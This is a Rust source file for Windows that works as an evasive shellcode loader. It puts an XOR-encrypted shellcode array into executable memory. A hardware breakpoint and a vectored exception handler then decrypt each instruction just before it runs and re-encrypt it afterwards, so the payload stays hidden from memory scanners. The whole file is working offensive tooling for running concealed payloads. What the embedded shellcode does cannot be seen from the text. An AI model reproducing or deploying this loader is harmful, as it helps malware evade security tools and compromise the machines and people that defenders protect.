use std::{
    io::Read,
    ptr::{self, null, null_mut},
};

//include lib has virtualalloc
use winapi::{
    shared::{
        basetsd::DWORD64,
        minwindef::{DWORD, FALSE},
        ntdef::{HANDLE, PVOID},
    },
    um::{
        errhandlingapi::{AddVectoredExceptionHandler, GetLastError},
        memoryapi::{VirtualAlloc, VirtualFree},
        minwinbase::EXCEPTION_SINGLE_STEP,
        processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext},
        winnt::{
            CONTEXT, CONTEXT_DEBUG_REGISTERS, EXCEPTION_POINTERS, LONG, MEM_COMMIT, MEM_RELEASE,
            MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        },
    },
    vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH},
};

static mut payload_lower_bound: DWORD64 = 0;
static mut payload_upper_bound: DWORD64 = 0;
static mut last_decrypted_asm: DWORD64 = 0;
static mut payload_base: DWORD64 = 0;
static key: &[u8] = b"hy7=$SB6F3Fyx*Dd9dQu#26K&-8:WM";
static MAX_X64_ASM_OPCODE_LEN: i32 = 15;
fn main() {
    //init shellcode byte array eb fe
    let shellcode = [
        0x94,0x31,0xb4,0xd9,0xd4,0xbb,0x82,0x36,0x46,0x33,0x07,0x28,0x39,0x7a,0x16,0x35,0x6f,0x2c,0x60,0xa7,0x46,0x7a,0xbd,0x19,0x46,0x65,0xb3,0x68,0x4f,0x05,0xe3,0x2b,0x17,0x75,0xaf,0x21,0x12,0x7e,0x49,0x84,0x0c,0x33,0x35,0x1b,0x8d,0x2c,0x08,0xa4,0xfd,0x49,0x42,0x4e,0x34,0x67,0x06,0x6c,0xf9,0xf3,0x5a,0x0c,0x69,0xb8,0xd5,0xd0,0x76,0x12,0x13,0x7e,0xcd,0x61,0x66,0xf2,0x3a,0x16,0x0c,0x65,0xe9,0xef,0xd1,0xfd,0x23,0x32,0x36,0x03,0xa3,0xed,0x4c,0x5d,0x1f,0x4c,0xb8,0x29,0xbc,0x75,0x3c,0x17,0xc9,0x76,0x66,0x7a,0x47,0xa9,0x9b,0x7c,0x0c,0x9b,0xf0,0x25,0xda,0x41,0xab,0x7a,0x37,0x9d,0x6b,0x1c,0xf1,0x72,0x66,0x8d,0xc4,0x38,0xf6,0xf4,0x29,0x12,0x43,0xf7,0x7e,0xd3,0x33,0x88,0x34,0x29,0x08,0x40,0x31,0x21,0x68,0xa4,0x56,0xea,0x6e,0x0f,0xad,0x6d,0x1c,0x73,0x56,0x9d,0x0e,0x38,0xbc,0x31,0x6c,0x17,0xc9,0x76,0x5a,0x7a,0x47,0xa9,0x39,0xa1,0x40,0xec,0x71,0x65,0x81,0x34,0x7b,0x73,0x6e,0x15,0x7f,0x77,0x79,0x62,0x16,0x14,0x29,0x23,0x7f,0xbe,0xc8,0x73,0x03,0x64,0xb9,0xd3,0x1e,0x38,0x21,0x70,0x0c,0xef,0x2b,0x8d,0x06,0x8a,0xdc,0xcd,0x6b,0x02,0x98,0x5a,0x4b,0x08,0x08,0x7e,0x5a,0x79,0x37,0x7c,0x72,0x1a,0xcb,0xd0,0x0e,0xb2,0xaa,0xd9,0x79,0x2a,0x44,0x2d,0xb0,0x81,0x18,0xc9,0x21,0x32,0x37,0xf0,0xe6,0x85,0xb6,0xba,0x16,0x19,0x21,0xf0,0xd3,0x71,0xad,0xa2,0x03,0x8c,0x0a,0x44,0x60,0x7e,0x87,0xff,0x08,0xed,0xd3,0x0c,0x50,0x74,0x23,0x32,0x6f,0x0a,0x9c,0x04,0xb8,0x51,0x57,0xb2,0xbd,0x29,0x67,0x70,0x15,0x9a,0x0f,0x07,0x86,0x7b,0xb9,0xb9,0x30,0xa3,0x86,0x2c,0xc6,0xa4,0x19,0xfc,0xe2,0x73,0x8c,0xa1,0x29,0xf2,0xd8,0xc5,0x82,0x05,0xe1,0xbe,0x5d,0x2d,0x65,0x0b,0x0e,0xbf,0xa4,0x7b,0xcf,0x80,0x39,0x90,0xdd,0xc1,0x4d,0x05,0xae,0xa0,0x6b,0xb3,0xf2,0x0b,0x24,0x2d,0x38,0x73,0xef,0x2e,0x05,0x1d,0x37,0x3d,0x24,0x53,0x42,0x77,0x16,0x72,0x16,0x31,0xf1,0xc8,0x13,0x33,0x6e,0x29,0x60,0xb5,0x49,0x3f,0x6f,0x0a,0x76,0xcf,0xc4,0x5c,0x90,0x09,0x4c,0x2d,0x36,0x3c,0x6c,0xde,0x06,0x12,0x5e,0xf5,0x46,0x11,0x30,0xa3,0xa2,0x32,0x69,0x25,0x01,0x34,0x73,0x73,0x66,0x02,0xd9,0xed,0x79,0x6a,0x1e,0xb2,0xa0,0x34,0xbe,0xfc,0x68,0xda,0x83,0x77,0xfc,0x4a,0x8a,0x46,0xfe,0xd5,0x91,0x2c,0x08,0xb6,0x19,0x8a,0xe9,0xb9,0x38,0x0a,0x9c,0x25,0xbf,0x27,0x37,0xb2,0xbd,0xc2,0xc7,0x88,0x86,0x05,0x03,0x8c,0xe0,0xa6,0xfb,0xe4,0x87,0xff,0x0c,0xe7,0xfd,0x4c,0x6d,0x73,0x5f,0x38,0xb6,0xb0,0xc6,0x58,0x3d,0x81,0x10,0x5e,0x1a,0x16,0x5d,0x3d,0x7d,0x12,0xcb,0xec,0xb9,0xe6
    ];
    // let shellcode = [
    //     0x20, 0x48, 0xe5, 0x58, 0x6c, 0xd8, 0x00, 0x56, 0x0e, 0xb8, 0x36, 0x61, 0x30, 0xa1, 0x32,
    //     0x44, 0x75, 0xef, 0x5f, 0x38, 0xa8, 0x3b, 0x7b, 0xc0, 0x6f, 0x0d, 0xd3, 0x59, 0x16, 0xc6,
    //     0x21, 0x45, 0x7a, 0x0c, 0xdb, 0x12, 0xf5, 0xbe, 0x0b, 0x32, 0x89, 0x30, 0x79, 0xe5, 0x01,
    //     0xef, 0x06, 0x29, 0x50, 0xba, 0x62, 0xb9, 0x79, 0x53, 0x63, 0xa6, 0x4f, 0x1a, 0x1a, 0x4c,
    //     0xa6, 0x9a, 0x08, 0xc2, 0xed, 0x1b, 0x73, 0xc0, 0x07, 0xb8, 0x72, 0xf7, 0x34, 0x2b, 0x8a,
    //     0x2c, 0x08, 0xa4, 0x19, 0x44, 0xf1, 0xce, 0x9a, 0xcf, 0xe6, 0x59, 0x3f, 0xfb, 0x9d, 0x40,
    //     0x69, 0xbb, 0xdc, 0xc9, 0x60, 0x6a, 0x80, 0x43, 0x9c, 0x76, 0xcd, 0x2e, 0x5c, 0x67, 0x45,
    //     0xae, 0x78, 0x6b, 0xe6, 0x79, 0x69, 0x77, 0xbd, 0x14, 0x3a, 0x60, 0x39, 0xf1, 0x16, 0xc6,
    //     0x6c, 0xf2, 0x7b, 0x3c, 0xec, 0x90, 0x81, 0x77, 0xfe, 0xab, 0xb8, 0xf3, 0x76, 0xc2, 0xd6,
    //     0x9b, 0xc6, 0x9b, 0x19, 0x44, 0xea, 0x63, 0x7e, 0xf2, 0x45, 0x4c, 0x54, 0x59, 0x79, 0x28,
    //     0x10, 0x1c, 0x66, 0x75, 0xa9, 0x5f, 0x66, 0x7e, 0x77, 0xe1, 0x0e, 0x86, 0xba, 0x62, 0xc7,
    //     0x88, 0x11, 0x9b, 0x81,
    // ];
    let SHELLCODE_PADDING = 32;
    let memory_size = SHELLCODE_PADDING + shellcode.len() + SHELLCODE_PADDING;
    unsafe {
        let mut heap_memory =
            VirtualAlloc(null_mut(), memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if heap_memory == null_mut() {
            println!("Failed to allocate memory");
            return;
        }
        println!("Allocated memory at: {:p}", heap_memory);
        payload_lower_bound = heap_memory as DWORD64;
        payload_upper_bound = payload_lower_bound + memory_size as DWORD64;
        //memset heap_memory to 0x90
        ptr::write_bytes(heap_memory as *mut u8, 0x90, memory_size);

        let payload_entry = (heap_memory as DWORD64 + SHELLCODE_PADDING as DWORD64) as *mut u8;
        println!("Payload entry: {:p}", payload_entry);

        //check if write_bytes is working
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            payload_entry as *mut u8,
            shellcode.len(),
        );

        let data = std::slice::from_raw_parts(payload_entry as *const u8, memory_size);
        println!("First 16 bytes: {:?}", &data[..16]);

        payload_base = payload_entry as DWORD64;
        if SetHardwareBreakpoint(payload_base as PVOID) == false {
            println!("Failed to set hardware breakpoint");
            return;
        }
        let veh: PVOID = AddVectoredExceptionHandler(1, Some(VehDecryptHeapAsm));
        if veh != null_mut() {
            println!("Executing the payload with VEH ASM decryption... This may take a while depending on the efficiency of the shellcode...");
            let vg: extern "C" fn() = std::mem::transmute(payload_entry);
            // println!("Press any key to continue...");
            // let _ = std::io::stdin().read(&mut [0u8]).unwrap();
            vg();
        }

        //Cleanup
        VirtualFree(heap_memory, 0, MEM_RELEASE);
        //pause the program to check the memory
    }
}

fn SetHardwareBreakpoint(address_of_breakpoint: PVOID) -> bool {
    unsafe {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        let currentThread: HANDLE = GetCurrentThread();
        let status = GetThreadContext(currentThread, &mut ctx);
        ctx.Dr0 = address_of_breakpoint as DWORD64;
        ctx.Dr7 |= (1 << 0); //GLOBAL BREAKPOINT
        ctx.Dr7 &= !(1 << 16);
        ctx.Dr7 &= !(1 << 17);
        //print reverse all bit of dr7

        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

        if (SetThreadContext(currentThread, &mut ctx) == FALSE) {
            println!("Error setting thread context: {}", GetLastError());
            return false;
        }

        return true;
    }
}

unsafe extern "system" fn VehDecryptHeapAsm(ExceptionInfo: *mut EXCEPTION_POINTERS) -> LONG {
    // println!("VEH Handler");
    let mut count = 0;
    if ((*(*ExceptionInfo).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP) {
        //If hardware breakpoint Dr0 is set, clear it
        if (*(*ExceptionInfo).ContextRecord).Dr0 != 0 {
            (*(*ExceptionInfo).ContextRecord).Dr0 = 0;
        }

        //Set TRAP flag to generate next EXCEPTION_SINGLE_STEP
        (*(*ExceptionInfo).ContextRecord).EFlags |= (1 << 8);

        //If shellcode is not in our bound, continue without encryption/decryption (example: if our shellcode executes a function in kernel32.dll)
        if ((*(*ExceptionInfo).ContextRecord).Rip < payload_lower_bound
            || (*(*ExceptionInfo).ContextRecord).Rip > payload_upper_bound)
        {
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        let current_asm_addr = (*(*ExceptionInfo).ContextRecord).Rip;

        //If there was a previous decrypted ASM instruction,encrypt it back
        if last_decrypted_asm != 0 {
            let mut key_index = GetXorKeyIndexForAsm(payload_base, last_decrypted_asm, key);

            let addr_last_decrypted_asm = last_decrypted_asm as *mut u8;
            for i in 0..MAX_X64_ASM_OPCODE_LEN {
                if key_index == key.len() as u32 {
                    key_index = 0;
                }
                *addr_last_decrypted_asm.add(i as usize) =
                    *addr_last_decrypted_asm.add(i as usize) ^ key[key_index as usize];
                key_index += 1;
            }
            // let data = std::slice::from_raw_parts(addr_last_decrypted_asm as *const u8, 15);
            // //print the decrypted asm as hex
            // println!("Encrypting ASM: {:x}", last_decrypted_asm);

            // for i in 0..15 {
            //     print!("{:x} ", data[i]);
            // }
            // println!();
        }

        //Decrypt the current ASM instruction to prepare it for execution
        let current_asm = current_asm_addr as *mut u8;
        let mut keyIndex = GetXorKeyIndexForAsm(payload_base, current_asm_addr, key);
        for i in 0..MAX_X64_ASM_OPCODE_LEN {
            if keyIndex == key.len() as u32 {
                keyIndex = 0;
            }
            *current_asm.add(i as usize) = *current_asm.add(i as usize) ^ key[keyIndex as usize];
            keyIndex += 1;
        }
        let data = std::slice::from_raw_parts(current_asm as *const u8, 15);
        //print the decrypted asm as hex

        //Save the last decrypted ASM address to encrypt it at the next iteration
        last_decrypted_asm = current_asm_addr;

        // println!("RIP: {:x}", (*(*ExceptionInfo).ContextRecord).Rip);

        // println!("Decrypting ASM: {:x}", current_asm_addr);
        // for i in 0..15 {
        //     print!("{:x} ", data[i]);
        // }
        // println!();
        // println!("Last decrypted ASM: {:x}", last_decrypted_asm);

        return EXCEPTION_CONTINUE_EXECUTION;
    } else {
        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn GetXorKeyIndexForAsm(
    shellcode_base: DWORD64,
    current_asm_addr: DWORD64,
    keyxor: &[u8],
) -> DWORD {
    let keySize: DWORD = keyxor.len() as DWORD;
    let difference = current_asm_addr - shellcode_base;
    let characterOffset: DWORD = (difference % keySize as u64) as DWORD;
    return characterOffset;
}
